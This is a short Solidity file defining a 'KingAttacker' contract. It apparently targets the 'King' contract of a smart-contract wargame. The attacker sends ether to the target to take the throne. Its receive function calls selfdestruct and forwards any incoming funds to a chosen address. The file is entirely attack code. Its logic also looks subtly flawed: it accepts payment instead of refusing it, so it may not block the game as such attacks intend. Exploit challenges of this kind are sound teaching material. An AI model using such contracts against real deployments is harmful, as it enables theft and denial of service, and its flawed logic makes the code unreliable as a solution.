// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingAttacker {
    King target;
    address payTo;
    error KingAttacker__CallError();


    constructor(address payable _target, address _payTo) payable {
        target = King(_target);
        payTo = _payTo;
    }

    receive() external payable {
        selfdestruct(payable(payTo));
    }

    function attack() payable public {
        (bool success, ) = address(target).call{value: msg.value}("");
        if (!success) {
            revert KingAttacker__CallError();
        }
    }

}